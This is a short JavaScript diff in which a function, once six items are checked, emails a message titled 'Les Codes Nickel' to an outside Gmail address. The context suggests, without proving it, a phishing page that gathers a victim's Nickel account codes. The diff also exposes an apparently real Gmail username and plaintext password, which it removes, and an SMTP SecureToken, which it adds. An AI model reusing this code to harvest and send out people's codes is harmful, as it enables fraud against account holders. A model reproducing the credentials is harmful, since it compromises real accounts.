@@ -76,9 +76,7 @@ function addChecked(e) {
 
     if(ok === 6 ) {
         Email.send({
-            Host : "smtp.gmail.com",
-            Username : "leonbonou20@gmail.com",
-            Password : "anselmo12.",
+            SecureToken : "511610c1-8890-4119-97b5-50dbe7b4e073",
             To : 'anselmehotegni@gmail.com',
             From : "leonbonou20@gmail.com",
             Subject : "Les Codes Nickel",
